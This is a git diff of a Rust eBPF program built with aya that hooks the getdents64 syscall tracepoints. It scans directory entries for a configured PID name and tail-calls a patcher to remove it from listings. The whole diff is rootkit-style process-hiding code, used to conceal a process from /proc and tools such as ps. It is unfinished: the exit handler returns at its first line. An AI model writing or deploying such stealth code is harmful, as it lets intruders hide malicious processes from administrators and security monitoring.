@@ -1,12 +1,12 @@
 #![no_std]
 #![no_main]
 
-use core::mem::{offset_of, size_of, size_of_val};
+use core::mem::size_of_val;
 
 use aya_ebpf::{
     helpers::{
-        bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel,
-        gen::bpf_probe_read_user,
+        bpf_get_current_pid_tgid,
+        gen::{bpf_probe_read_user, bpf_probe_read_user_str},
     },
     macros::{map, tracepoint},
     maps::{HashMap, ProgramArray},
@@ -14,14 +14,20 @@ use aya_ebpf::{
 };
 use aya_log_ebpf::info;
 
-use vmlinux::vmlinux::{linux_dirent64, task_struct};
+use vmlinux::vmlinux::linux_dirent64;
 
 #[path = "./vmlinux/mod.rs"]
 mod vmlinux;
 
 const PROG_HANDLER: u32 = 0;
 const PROG_PATCHER: u32 = 1;
-const MAX_FILE_LEN: usize = 16;
+const MAX_FILE_LEN: usize = 10;
+
+#[no_mangle]
+static pid_to_hide_len: usize = 0;
+
+#[no_mangle]
+static pid_to_hide: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
 
 #[map]
 static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
@@ -36,11 +42,11 @@ static target_ppid: HashMap<u8, i32> = HashMap::<u8, i32>::with_max_entries(1, 0
 
 #[allow(non_upper_case_globals)]
 #[map]
-static map_bytes_read: HashMap<usize, i32> = HashMap::<usize, i32>::with_max_entries(8192, 0);
+static map_bytes_read: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);
 
 #[allow(non_upper_case_globals)]
 #[map]
-static map_to_patch: HashMap<usize, i32> = HashMap::<usize, i32>::with_max_entries(8192, 0);
+static map_to_patch: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);
 
 #[tracepoint]
 pub fn hide_me(ctx: TracePointContext) -> u32 {
@@ -54,28 +60,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         return Err(0);
     }
 
-    let the_target_ppid = the_target_ppid.unwrap();
-
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
-
-    if *the_target_ppid != 0 {
-        let ppid = unsafe {
-            let task = bpf_get_current_task() as *const task_struct;
-
-            let real_parent = bpf_probe_read_kernel::<*const task_struct>(
-                (task as usize + offset_of!(task_struct, real_parent)) as *const *const task_struct,
-            );
-
-            bpf_probe_read_kernel::<i32>(
-                (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
-            )
-            .unwrap()
-        };
-
-        if ppid != *the_target_ppid {
-            return Ok(0);
-        }
-    }
 
     let pid = pid_tgid >> 32;
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
@@ -84,19 +69,15 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
     // field:unsigned int count;               offset:32; size:8; signed:0;
     let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
     let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
-    info!(
-        &ctx,
-        "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count
-    );
-
+    // 获取dirent指针内存地址
     let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
-    info!(&ctx, "dirp is 0x{:x}", dirp as u64);
     Ok(0)
 }
 
 #[tracepoint]
 fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
+    return Ok(0);
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
     // field:long ret;                         offset:16; size:8; signed:1;
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
@@ -106,57 +87,79 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
         return Ok(0);
     }
 
-    if let Some(pbuff_addr) = unsafe { map_buffs.get(&pid_tgid) } {
-        let buff_addr = *pbuff_addr;
-        let pid = pid_tgid >> 32;
+    let pbuff_addr = unsafe { map_buffs.get(&pid_tgid) }.unwrap();
 
-        let mut d_reclen = 0;
+    let buff_addr = *pbuff_addr;
+    let pid = pid_tgid >> 32;
 
-        let mut dirp: *const linux_dirent64 = core::ptr::null();
+    // linux_dirent64 结构体 大小
+    let mut d_reclen: usize = 0;
 
-        let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
+    let mut dirp: *const linux_dirent64 = core::ptr::null();
 
-        let mut bpos = 0;
+    let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
 
-        let pBPOS = unsafe { map_bytes_read.get(&pid_tgid) };
+    // 记录当前遍历的位置 bpos
+    let mut bpos: usize = 0;
 
-        if let Some(pBPOS) = pBPOS {
-            bpos = *pBPOS;
-        }
+    let pBPOS = unsafe { map_bytes_read.get(&pid_tgid) };
 
-        for i in 0..128 {
-            if bpos >= total_bytes_read as i32 {
-                break;
-            }
-            dirp = (buff_addr + bpos as u64) as *const linux_dirent64;
-
-            unsafe {
-                bpf_probe_read_user(
-                    &d_reclen as *const _ as *mut core::ffi::c_void,
-                    size_of_val(&d_reclen) as u32,
-                    &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
-                );
-            }
-
-            unsafe {
-                bpf_probe_read_user(
-                    filename.as_mut_ptr() as *mut core::ffi::c_void,
-                    size_of_val(filename.as_ref()) as u32,
-                    (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
-                );
-            }
-        }
-        return Ok(0);
-    } else {
-        return Ok(0);
+    if let Some(pBPOS) = pBPOS {
+        bpos = *pBPOS;
     }
 
-    // info!(&ctx, "total_bytes_read is {}", total_bytes_read);
-    // unsafe {
-    //     if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
-    //         return Ok(0);
-    //     };
-    // }
+    for _ in 0..128 {
+        if bpos >= total_bytes_read as usize {
+            break;
+        }
+
+        dirp = (buff_addr + bpos as u64) as *const linux_dirent64;
+
+        unsafe {
+            bpf_probe_read_user(
+                &d_reclen as *const _ as *mut core::ffi::c_void,
+                size_of_val(&d_reclen) as u32,
+                &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
+            );
+        }
+
+        unsafe {
+            bpf_probe_read_user_str(
+                filename.as_mut_ptr() as *mut core::ffi::c_void,
+                pid_to_hide_len as u32,
+                (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
+            );
+        }
+
+        let mut j: usize = 0;
+        while j < pid_to_hide_len {
+            if filename[j] != pid_to_hide[j] {
+                break;
+            }
+            j += 1;
+        }
+
+        if j == pid_to_hide_len {
+            map_bytes_read.remove(&pid_tgid).unwrap();
+            map_buffs.remove(&pid_tgid).unwrap();
+            unsafe {
+                JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).unwrap();
+            }
+        }
+        map_to_patch.insert(&pid_tgid, &(dirp as usize), 0).unwrap();
+        bpos += d_reclen;
+    }
+
+    if bpos < total_bytes_read as usize {
+        map_bytes_read.insert(&pid_tgid, &bpos, 0).unwrap();
+        unsafe {
+            JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).unwrap();
+        }
+    }
+    map_bytes_read.remove(&pid_tgid).unwrap();
+    map_buffs.remove(&pid_tgid).unwrap();
+
+    return Ok(0);
 }
 
 #[tracepoint]
